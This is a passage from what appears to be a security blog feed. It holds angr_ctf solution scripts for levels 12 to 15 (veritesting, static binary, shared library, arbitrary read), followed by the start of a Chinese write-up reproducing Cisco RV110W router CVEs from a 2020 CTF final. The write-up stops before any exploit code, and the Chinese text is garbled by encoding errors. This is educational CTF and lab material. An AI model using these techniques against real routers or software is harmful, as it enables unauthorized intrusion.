title="12_angr_veritesting"></a>12_angr_veritesting</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># When you construct a simulation manager, you will want to enable Veritesting:</span></span><br><span class="line"><span class="comment"># project.factory.simgr(initial_state, veritesting=True)</span></span><br><span class="line"><span class="comment"># Hint: use one of the first few levels&#x27; solutions as a reference.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state, veritesting=<span class="literal">True</span>)</span><br><span class="line">    simulation.explore(find=<span class="number">0x804867C</span>)</span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        print(simulation.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="13-angr-static-binary"><a href="#13-angr-static-binary" class="headerlink" title="13_angr_static_binary"></a>13_angr_static_binary</h2><blockquote><p>Additionally, note that, when the binary is executed, the main function is not</p><p>the first piece of code called. In the _start function, __libc_start_main is </p><p>called to start your program. The initialization that occurs in this function</p><p>can take a long time <em>with</em> Angr, so you should replace it <em>with</em> a SimProcedure.</p><p>angr.SIM_PROCEDURES[â€˜glibcâ€™][â€˜__libc_start_mainâ€™]</p><p>Note â€˜glibcâ€™ instead of â€˜libcâ€™.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This challenge is the exact same as the first challenge, except that it was</span></span><br><span class="line"><span class="comment"># compiled as a static binary. Normally, Angr automatically replaces standard</span></span><br><span class="line"><span class="comment"># library functions with SimProcedures that work much more quickly.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Here are a few SimProcedures Angr has already written for you. They implement</span></span><br><span class="line"><span class="comment"># standard library functions. You will not need all of them:</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;malloc&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fopen&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fclose&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;fwrite&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;getchar&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strncmp&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;strcmp&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;scanf&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;printf&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;puts&#x27;]</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;exit&#x27;]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># As a reminder, you can hook functions with something similar to: </span></span><br><span class="line"><span class="comment"># project.hook(malloc_address, angr.SIM_PROCEDURES[&#x27;libc&#x27;][&#x27;malloc&#x27;])</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># There are many more, see:</span></span><br><span class="line"><span class="comment"># https://github.com/angr/angr/tree/master/angr/procedures/libc</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Additionally, note that, when the binary is executed, the main function is not</span></span><br><span class="line"><span class="comment"># the first piece of code called. In the _start function, __libc_start_main is </span></span><br><span class="line"><span class="comment"># called to start your program. The initialization that occurs in this function</span></span><br><span class="line"><span class="comment"># can take a long time with Angr, so you should replace it with a SimProcedure.</span></span><br><span class="line"><span class="comment"># angr.SIM_PROCEDURES[&#x27;glibc&#x27;][&#x27;__libc_start_main&#x27;]</span></span><br><span class="line"><span class="comment"># Note &#x27;glibc&#x27; instead of &#x27;libc&#x27;.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">    bin_path = argv[<span class="number">1</span>]</span><br><span class="line">    project = angr.Project(bin_path)</span><br><span class="line"></span><br><span class="line">    project.hook(<span class="number">0x8048D10</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;glibc&#x27;</span>][<span class="string">&#x27;__libc_start_main&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804ED40</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;printf&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x0804ED80</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;scanf&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x805B450</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;strcmp&#x27;</span>]())</span><br><span class="line">    project.hook(<span class="number">0x804F350</span>, angr.SIM_PROCEDURES[<span class="string">&#x27;libc&#x27;</span>][<span class="string">&#x27;puts&#x27;</span>]())</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">good</span>(<span class="params">state</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> state.posix.dumps(<span class="number">1</span>)</span><br><span class="line">    simulation.explore(find=good)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        print(simulation.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="14-angr-shared-library"><a href="#14-angr-shared-library" class="headerlink" title="14_angr_shared_library"></a>14_angr_shared_library</h2><blockquote><p>The shared library has the function validate, which takes a string and returns either true (1) or false (0). The binary calls this function. If it returns true, the program prints â€œGood Job.â€ otherwise, it prints â€œTry again.â€</p><p>Note: When you run this script, make sure you run it on lib14_angr_shared_library.so, not the executable. This level is intended to teach how to analyse binary formats that are not typical executables.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># The shared library has the function validate, which takes a string and returns</span></span><br><span class="line"><span class="comment"># either true (1) or false (0). The binary calls this function. If it returns</span></span><br><span class="line"><span class="comment"># true, the program prints &quot;Good Job.&quot; otherwise, it prints &quot;Try again.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Note: When you run this script, make sure you run it on </span></span><br><span class="line"><span class="comment"># lib14_angr_shared_library.so, not the executable. This level is intended to </span></span><br><span class="line"><span class="comment"># teach how to analyse binary formats that are not typical executables.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">  <span class="comment"># The shared library is compiled with position-independent code. You will need</span></span><br><span class="line">  <span class="comment"># to specify the base address. All addresses in the shared library will be</span></span><br><span class="line">  <span class="comment"># base + offset, where offset is their address in the file.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  base = <span class="number">0x4000000</span></span><br><span class="line">  project = angr.Project(path_to_binary, load_options=&#123; </span><br><span class="line">    <span class="string">&#x27;main_opts&#x27;</span> : &#123; </span><br><span class="line">      <span class="string">&#x27;custom_base_addr&#x27;</span> : base </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Initialize any symbolic values here; you will need at least one to pass to</span></span><br><span class="line">  <span class="comment"># the validate function.</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Begin the state at the beginning of the validate function, as if it was</span></span><br><span class="line">  <span class="comment"># called by the program. Determine the parameters needed to call validate and</span></span><br><span class="line">  <span class="comment"># replace &#x27;parameters...&#x27; with bitvectors holding the values you wish to pass.</span></span><br><span class="line">  <span class="comment"># Recall that &#x27;claripy.BVV(value, size_in_bits)&#x27; constructs a bitvector </span></span><br><span class="line">  <span class="comment"># initialized to a single value.</span></span><br><span class="line">  <span class="comment"># Remember to add the base value you specified at the beginning to the</span></span><br><span class="line">  <span class="comment"># function address!</span></span><br><span class="line">  <span class="comment"># Hint: int validate(char* buffer, int length) &#123; ...</span></span><br><span class="line">  <span class="comment"># Another hint: the password is 8 bytes long.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  validate_function_address = <span class="number">0x6d7</span></span><br><span class="line">  buffer_pointer = claripy.BVV(<span class="number">0x3000000</span>, <span class="number">32</span>)</span><br><span class="line">  initial_state = project.factory.call_state(validate_function_address, buffer_pointer, claripy.BVV(<span class="number">8</span>, <span class="number">32</span>))</span><br><span class="line">  password = claripy.BVS(<span class="string">&#x27;password&#x27;</span>, <span class="number">8</span>*<span class="number">8</span>)</span><br><span class="line">  initial_state.memory.store(buffer_pointer, password)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># You will need to add code to inject a symbolic value into the program at the</span></span><br><span class="line">  <span class="comment"># end of the function that constrains eax to equal true (value of 1) just</span></span><br><span class="line">  <span class="comment"># before the function returns. There are multiple ways to do this:</span></span><br><span class="line">  <span class="comment"># 1. Use a hook.</span></span><br><span class="line">  <span class="comment"># 2. Search for the address just before the function returns and then</span></span><br><span class="line">  <span class="comment">#    constrain eax (this may require putting code elsewhere)</span></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  success_address =  base + <span class="number">0x783</span></span><br><span class="line">  simulation.explore(find=success_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Determine where the program places the return value, and constrain it so</span></span><br><span class="line">    <span class="comment"># that it is true. Then, solve for the solution and print it.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    pirnt(solution_state.solver.<span class="built_in">eval</span>(password, cast_to=<span class="built_in">bytes</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="15-angr-arbitrary-read"><a href="#15-angr-arbitrary-read" class="headerlink" title="15_angr_arbitrary_read"></a>15_angr_arbitrary_read</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># You can either use a blank state or an entry state; just make sure to start</span></span><br><span class="line">  <span class="comment"># at the beginning of the program.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Again, scanf needs to be replaced.</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">ReplacementScanf</span>(<span class="params">angr.SimProcedure</span>):</span></span><br><span class="line">    <span class="comment"># Hint: scanf(&quot;%u %20s&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self, format_string, param0, param1</span>):</span></span><br><span class="line">      <span class="comment"># %u</span></span><br><span class="line">      scanf0 = claripy.BVS(<span class="string">&#x27;scanf0&#x27;</span>, <span class="number">32</span>)</span><br><span class="line">      </span><br><span class="line">      <span class="comment"># %20s</span></span><br><span class="line">      scanf1 = claripy.BVS(<span class="string">&#x27;scanf1&#x27;</span>, <span class="number">20</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># The bitvector.chop(bits=n) function splits the bitvector into a Python</span></span><br><span class="line">      <span class="comment"># list containing the bitvector in segments of n bits each. In this case,</span></span><br><span class="line">      <span class="comment"># we are splitting them into segments of 8 bits (one byte.)</span></span><br><span class="line">      <span class="keyword">for</span> char <span class="keyword">in</span> scanf1.chop(bits=<span class="number">8</span>):</span><br><span class="line">        <span class="comment"># Ensure that each character in the string is printable. An interesting</span></span><br><span class="line">        <span class="comment"># experiment, once you have a working solution, would be to run the code</span></span><br><span class="line">        <span class="comment"># without constraining the characters to the printable range of ASCII.</span></span><br><span class="line">        <span class="comment"># Even though the solution will technically work without this, it&#x27;s more</span></span><br><span class="line">        <span class="comment"># difficult to enter in a solution that contains character you can&#x27;t</span></span><br><span class="line">        <span class="comment"># copy, paste, or type into your terminal or the web form that checks </span></span><br><span class="line">        <span class="comment"># your solution.</span></span><br><span class="line">        <span class="comment"># (!)</span></span><br><span class="line">        self.state.add_constraints(char &gt;= <span class="string">&#x27;A&#x27;</span>, char &lt;= <span class="string">&#x27;Z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">      <span class="comment"># Warning: Endianness only applies to integers. If you store a string in</span></span><br><span class="line">      <span class="comment"># memory and treat it as a little-endian integer, it will be backwards.</span></span><br><span class="line">      scanf0_address = param0</span><br><span class="line">      self.state.memory.store(scanf0_address, scanf0, endness=project.arch.memory_endness)</span><br><span class="line">      scanf1_address = param1</span><br><span class="line">      self.state.memory.store(scanf1_address, scanf1)</span><br><span class="line"></span><br><span class="line">      self.state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>] = (scanf0, scanf1)</span><br><span class="line"></span><br><span class="line">  scanf_symbol = <span class="string">&#x27;__isoc99_scanf&#x27;</span>  <span class="comment"># :string</span></span><br><span class="line">  project.hook_symbol(scanf_symbol, ReplacementScanf())</span><br><span class="line"></span><br><span class="line">  <span class="comment"># We will call this whenever puts is called. The goal of this function is to</span></span><br><span class="line">  <span class="comment"># determine if the pointer passed to puts is controllable by the user, such</span></span><br><span class="line">  <span class="comment"># that we can rewrite it to point to the string &quot;Good Job.&quot;</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">check_puts</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment"># Treat the implementation of this function as if puts was just called.</span></span><br><span class="line">    <span class="comment"># The stack, registers, memory, etc should be set up as if the x86 call</span></span><br><span class="line">    <span class="comment"># instruction was just invoked (but, of course, the function hasn&#x27;t copied</span></span><br><span class="line">    <span class="comment"># the buffers yet.)</span></span><br><span class="line">    <span class="comment"># The stack will look as follows:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line">    <span class="comment"># esp + 7 -&gt; /----------------\</span></span><br><span class="line">    <span class="comment"># esp + 6 -&gt; |      puts      |</span></span><br><span class="line">    <span class="comment"># esp + 5 -&gt; |    parameter   |</span></span><br><span class="line">    <span class="comment"># esp + 4 -&gt; \----------------/</span></span><br><span class="line">    <span class="comment"># esp + 3 -&gt; /----------------\</span></span><br><span class="line">    <span class="comment"># esp + 2 -&gt; |     return     |</span></span><br><span class="line">    <span class="comment"># esp + 1 -&gt; |     address    |</span></span><br><span class="line">    <span class="comment">#     esp -&gt; \----------------/</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    puts_parameter = state.memory.load(state.regs.esp + <span class="number">4</span>, <span class="number">4</span>, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># The following function takes a bitvector as a parameter and checks if it</span></span><br><span class="line">    <span class="comment"># can take on more than one value. While this does not necessary tell us we</span></span><br><span class="line">    <span class="comment"># have found an exploitable path, it is a strong indication that the </span></span><br><span class="line">    <span class="comment"># bitvector we checked may be controllable by the user.</span></span><br><span class="line">    <span class="comment"># Use it to determine if the pointer passed to puts is symbolic.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    <span class="keyword">if</span> state.se.symbolic(puts_parameter):</span><br><span class="line">      <span class="comment"># Determine the location of the &quot;Good Job.\n&quot; string. We want to print it</span></span><br><span class="line">      <span class="comment"># out, and we will do so by attempting to constrain the puts parameter to</span></span><br><span class="line">      <span class="comment"># equal it. (Hint: look at .rodata).</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      good_job_string_address = <span class="number">0x594e4257</span> <span class="comment"># :integer, probably hexadecimal</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Create an expression that will test if puts_parameter equals</span></span><br><span class="line">      <span class="comment"># good_job_string_address. If we add this as a constraint to our solver,</span></span><br><span class="line">      <span class="comment"># it will try and find an input to make this expression true.</span></span><br><span class="line">      <span class="comment"># (!)</span></span><br><span class="line">      is_vulnerable_expression = puts_parameter == good_job_string_address <span class="comment"># :boolean bitvector expression</span></span><br><span class="line"></span><br><span class="line">      <span class="comment"># Have Angr evaluate the state to determine if all the constraints can</span></span><br><span class="line">      <span class="comment"># be met, including the one we specified above. If it can be satisfied,</span></span><br><span class="line">      <span class="comment"># we have found our exploit!</span></span><br><span class="line">      </span><br><span class="line">      copied_state = state.copy()</span><br><span class="line"></span><br><span class="line">      copied_state.add_constraints(is_vulnerable_expression)</span><br><span class="line">       </span><br><span class="line">      <span class="keyword">if</span> copied_state.satisfiable():</span><br><span class="line">        <span class="comment"># Before we return, let&#x27;s add the constraint to the solver for real,</span></span><br><span class="line">        <span class="comment"># instead of just querying whether the constraint _could_ be added.</span></span><br><span class="line">        state.add_constraints(is_vulnerable_expression)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># not path.state.se.symbolic(???)</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="comment"># We are looking for puts. Check that the address is at the (very) beginning</span></span><br><span class="line">    <span class="comment"># of the puts function. Warning: while, in theory, you could look for</span></span><br><span class="line">    <span class="comment"># any address in puts, if you execute any instruction that adjusts the stack</span></span><br><span class="line">    <span class="comment"># pointer, the stack diagram above will be incorrect. Therefore, it is</span></span><br><span class="line">    <span class="comment"># recommended that you check for the very beginning of puts.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    puts_address = <span class="number">0x8048370</span></span><br><span class="line">    <span class="keyword">if</span> state.addr == puts_address:</span><br><span class="line">      <span class="comment"># Return True if we determine this call to puts is exploitable.</span></span><br><span class="line">      <span class="keyword">return</span> check_puts(state)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="comment"># We have not yet found a call to puts; we should continue!</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Determine the situation in which you should avoid. Optionally, you can</span></span><br><span class="line">  <span class="comment"># remove the avoid parameter, although it may cause the program to run more</span></span><br><span class="line">  <span class="comment"># slowly.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  simulation.explore(find=is_successful)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    (scanf0, scanf1) = solution_state.<span class="built_in">globals</span>[<span class="string">&#x27;solutions&#x27;</span>]</span><br><span class="line">    solution = <span class="built_in">str</span>(solution_state.se.<span class="built_in">eval</span>(scanf0)) + <span class="string">&#x27; &#x27;</span> + solution_state.se.<span class="built_in">eval</span>(scanf1,cast_to=<span class="built_in">str</span>)</span><br><span class="line">    <span class="built_in">print</span> solution</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>(Not endâ€¦)</p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼ºç½‘æ¯2020å†³èµ› Cisco RV110Wè·¯ç”±å™¨å¤ç°</title>
      <link href="2021/08/31/Real-World-Cisco-RV110W/"/>
      <url>2021/08/31/Real-World-Cisco-RV110W/</url>
      
        <content type="html"><![CDATA[<h2 id="mips-åŸºç¡€çŸ¥è¯†"><a href="#mips-åŸºç¡€çŸ¥è¯†" class="headerlink" title="mips åŸºç¡€çŸ¥è¯†"></a>mips åŸºç¡€çŸ¥è¯†</h2><p>å†æ¬¡æ„Ÿè°¢è½©å“¥å’Œè½©å“¥åª³å¦‡é€çš„cheatsheet</p><p><img src="https://i.loli.net/2021/09/01/G8nwCeZhVcH54XE.png" alt=""></p><p>mipsæ¶æ„ä¸ºRISCï¼Œå¸¸è§çš„mipsèŠ¯ç‰‡æµæ°´çº¿æ“ä½œä¸ºäº”çº§</p><p><img src="https://i.loli.net/2021/05/09/2vwRVbPh7rODFoG.png" alt=""></p><p>IF = instruction fetch æŒ‡ä»¤æå–é˜¶æ®µ</p><p>ID = Instruction decode æŒ‡ä»¤è¯‘ç é˜¶æ®µ</p><p>EX = æ‰§è¡Œé˜¶æ®µ</p><p>MEM = å­˜å‚¨å™¨è®¿é—®é˜¶æ®µ</p><p>WB = å¯„å­˜å™¨å†™å›é˜¶æ®µ</p><blockquote><p>ä»¥iå¯¹åº”çš„æ—¶åˆ»å¾€åæ¨ç§»ï¼Œæœ€æ—©çš„æŒ‡ä»¤å·²ç»åˆ°äº†WBé˜¶æ®µï¼Œæœ€æ–°çš„æŒ‡ä»¤æ­£åœ¨è¿›è¡ŒæŒ‡ä»¤æå–ã€‚å¯¹äºè·³è½¬/åˆ†æ”¯æŒ‡ä»¤ï¼Œå½“å…¶åˆ°è¾¾æ‰§è¡Œé˜¶æ®µä¸”æ–°çš„ç¨‹åºè®¡æ•°å™¨æ„å·²ç»äº§ç”Ÿæ—¶ï¼Œç´§éšå…¶åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤å®é™…ä¸Šå·²ç»å¼€å§‹æ‰§è¡Œäº†ï¼Œmipsè§„å®šåˆ†æ”¯ä¹‹åçš„æŒ‡ä»¤æ€»æ˜¯åœ¨åˆ†æ”¯ç›®æ ‡æŒ‡ä»¤ä¹‹å‰è¿›è¡Œï¼Œç´§éšåˆ†æ”¯æŒ‡ä»¤ä¹‹åçš„ä½ç½®ç§°ä¸ºåˆ†æ”¯å»¶è¿Ÿæ§½ï¼Œåœ¨æ²¡æœ‰ä»»ä½•å¯ç”¨æ“ä½œæ—¶ï¼Œå»¶è¿Ÿæ§½å°†å¡«å……nopå ä½ã€‚</p></blockquote><p>å…³äºè°ƒç”¨çº¦å®šï¼Œå¸¸ç”¨çš„mipså¯„å­˜å™¨ä½œç”¨å¦‚ä¸‹</p><blockquote><ul><li>â€œ<code>$a0â€œ</code> â€“ â€œ<code>$a3â€œ</code>ï¼šå‡½æ•°è°ƒç”¨æ—¶çš„å‚æ•°ä¼ é€’ï¼Œè‹¥å‚æ•°è¶…è¿‡ 4 ä¸ªï¼Œåˆ™å¤šä½™çš„ä½¿ç”¨å †æ ˆä¼ é€’</li><li>â€œ<code>$t0â€œ</code>-â€œ<code>$t7â€œ</code>ï¼šä¸´æ—¶å¯„å­˜å™¨</li><li>â€œ<code>$s0â€œ</code> â€“ â€œ<code>$s7â€œ</code>ï¼šä¿å­˜å¯„å­˜å™¨ï¼Œä½¿ç”¨æ—¶éœ€å°†ç”¨åˆ°çš„å¯„å­˜å™¨ä¿å­˜åˆ°å †æ ˆ</li><li>â€œ<code>$gpâ€œ</code>ï¼šå…¨å±€æŒ‡é’ˆï¼Œç”¨äºå–æ•°æ®ï¼ˆ32Kè®¿é—®å†…ï¼‰ï¼›â€œ<code>$spâ€œ</code>ï¼šæ ˆæŒ‡é’ˆï¼ŒæŒ‡å‘æ ˆé¡¶</li><li>â€œ<code>$fpâ€œ</code>ï¼šæ ˆå¸§æŒ‡é’ˆï¼›</li><li>â€œ<code>$raâ€œ</code>ï¼šå­˜å‚¨è¿”å›åœ°å€ï¼›</li></ul></blockquote><p>å…¶ä»–çš„å‚è§æœ€ä¸Šé¢çš„å›¾:-)</p><p>æ¯”è¾ƒé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼Œå½“æœ¬å‡½æ•°æ˜¯å¶å­å‡½æ•°çš„æ—¶å€™ï¼ˆå³ä¸ä¼šå†è°ƒç”¨å…¶ä»–å‡½æ•°ï¼‰ï¼Œraå¯„å­˜å™¨æ˜¯ä¸ä¼šå…¥æ ˆçš„ï¼›éå¶å­å‡½æ•°çš„æ—¶å€™ï¼Œraå¯„å­˜å™¨å…¥æ ˆï¼Œæœ‰å¯ä»¥é€šè¿‡æ ˆæº¢å‡ºæ¥åŠ«æŒæ§åˆ¶æµçš„æœºä¼šã€‚</p><h2 id="ciscoè·¯ç”±å™¨-RV110W-æ¼æ´å¤ç°"><a href="#ciscoè·¯ç”±å™¨-RV110W-æ¼æ´å¤ç°" class="headerlink" title="ciscoè·¯ç”±å™¨ RV110W æ¼æ´å¤ç°"></a>ciscoè·¯ç”±å™¨ RV110W æ¼æ´å¤ç°</h2><p>é¢˜ç›®å›ºä»¶ï¼š<a href="https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin">https://xuanxuanblingbling.github.io/assets/attachment/RV110W_FW_1.2.2.5.bin</a></p><p>è™½ç„¶ç½‘ä¸Šæœ‰dockerç¯å¢ƒå¯ä»¥ç”¨ï¼Œä½†æ˜¯è¿˜æ˜¯å»ºè®®ä¹°ä¸€ä¸ªå®ä½“æœºï¼ŒæŸé±¼ä¸Šæœ‰</p><h3 id="åŸºç¡€åˆ†æ"><a href="#åŸºç¡€åˆ†æ" class="headerlink" title="åŸºç¡€åˆ†æ"></a>åŸºç¡€åˆ†æ</h3><p>ç«¯å£æ‰«æï¼Œæ‰«æå¸¸ç”¨ç«¯å£ï¼Œå‘ç°å¼€äº†telnetï¼Œå’ŒwebæœåŠ¡çš„ç«¯å£ï¼Œå¹¶ä¸”ç»è¿‡curlæµ‹è¯•ï¼Œ80ä¼šé‡å®šå‘åˆ°443</p><p><img src="https://i.loli.net/2021/09/01/3DFOSYuKwQs5fUr.png" alt=""></p><p>å›ºä»¶è§£åŒ…ï¼Œç›´æ¥ç”¨binwalkï¼Œéœ€è¦å®‰è£…sasquatchä»¥è§£å¼€éæ ‡å‡†çš„SquashFSæ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev</span><br><span class="line">git clone https://github.com/devttys0/sasquatch</span><br><span class="line">(cd sasquatch &amp;&amp; ./build.sh)</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h3><p>æ ¹æ®xuanxuanå¸ˆå‚…çš„æè¿°ï¼Œå½“æ—¶è€ƒè™‘æ˜¯1dayï¼Œå°±å¼€å§‹æœcve</p><p>åœ¨ç¬¦åˆèµ›é¢˜è¦æ±‚çš„å‰æä¸‹æ‰¾åˆ°ä¸‰ä¸ªç›¸å…³æ¼æ´CVE-2020-3330(telnetå¼±å£ä»¤)ï¼ŒCVE-2020-3331 &amp; CVE-2020-3323(WebæœåŠ¡)</p><h4 id="telnetå¼±å£ä»¤"><a href="#telnetå¼±å£ä»¤" class="headerlink" title="telnetå¼±å£ä»¤"></a>telnetå¼±å£ä»¤</h4><p><a 